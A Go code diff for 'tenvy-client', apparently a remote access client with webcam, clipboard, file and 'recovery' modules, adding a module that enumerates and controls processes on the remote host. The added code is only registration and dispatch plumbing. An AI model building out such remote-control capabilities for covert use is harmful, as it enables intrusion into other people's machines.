@@ -18,6 +18,7 @@ import (
 	webcamctrl "github.com/rootbay/tenvy-client/internal/modules/control/webcam"
 	clipboard "github.com/rootbay/tenvy-client/internal/modules/management/clipboard"
 	filemanager "github.com/rootbay/tenvy-client/internal/modules/management/filemanager"
+	taskmanager "github.com/rootbay/tenvy-client/internal/modules/management/taskmanager"
 	tcpconnections "github.com/rootbay/tenvy-client/internal/modules/management/tcpconnections"
 	clientchat "github.com/rootbay/tenvy-client/internal/modules/misc/clientchat"
 	recovery "github.com/rootbay/tenvy-client/internal/modules/operations/recovery"
@@ -140,6 +141,7 @@ func newDefaultModuleManager() *moduleManager {
 	registry.register(&webcamModule{})
 	registry.register(&clipboardModule{})
 	registry.register(&fileManagerModule{})
+	registry.register(&taskManagerModule{})
 	registry.register(&tcpConnectionsModule{})
 	registry.register(&clientChatModule{})
 	registry.register(&recoveryModule{})
@@ -879,6 +881,62 @@ func (m *fileManagerModule) Handle(ctx context.Context, cmd protocol.Command) pr
 
 func (m *fileManagerModule) Shutdown(context.Context) {
 	// no teardown required for file system operations today
+}
+
+type taskManagerModule struct {
+	manager *taskmanager.Manager
+}
+
+func (m *taskManagerModule) Metadata() ModuleMetadata {
+	return ModuleMetadata{
+		ID:          "task-manager",
+		Title:       "Task Manager",
+		Description: "Enumerate and control processes on the remote host.",
+		Commands:    []string{"task-manager"},
+		Capabilities: []ModuleCapability{
+			{
+				Name:        "task-manager.list",
+				Description: "Collect real-time process snapshots with metadata.",
+			},
+			{
+				Name:        "task-manager.control",
+				Description: "Start and orchestrate process actions on demand.",
+			},
+		},
+	}
+}
+
+func (m *taskManagerModule) Init(_ context.Context, runtime ModuleRuntime) error {
+	return m.configure(runtime)
+}
+
+func (m *taskManagerModule) UpdateConfig(_ context.Context, runtime ModuleRuntime) error {
+	return m.configure(runtime)
+}
+
+func (m *taskManagerModule) configure(runtime ModuleRuntime) error {
+	if m.manager == nil {
+		m.manager = taskmanager.NewManager(runtime.Logger)
+		return nil
+	}
+	m.manager.UpdateLogger(runtime.Logger)
+	return nil
+}
+
+func (m *taskManagerModule) Handle(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
+	if m.manager == nil {
+		return protocol.CommandResult{
+			CommandID:   cmd.ID,
+			Success:     false,
+			Error:       "task manager subsystem not initialized",
+			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
+		}
+	}
+	return m.manager.HandleCommand(ctx, cmd)
+}
+
+func (m *taskManagerModule) Shutdown(context.Context) {
+	// no persistent resources to release today
 }
 
 type tcpConnectionsModule struct {
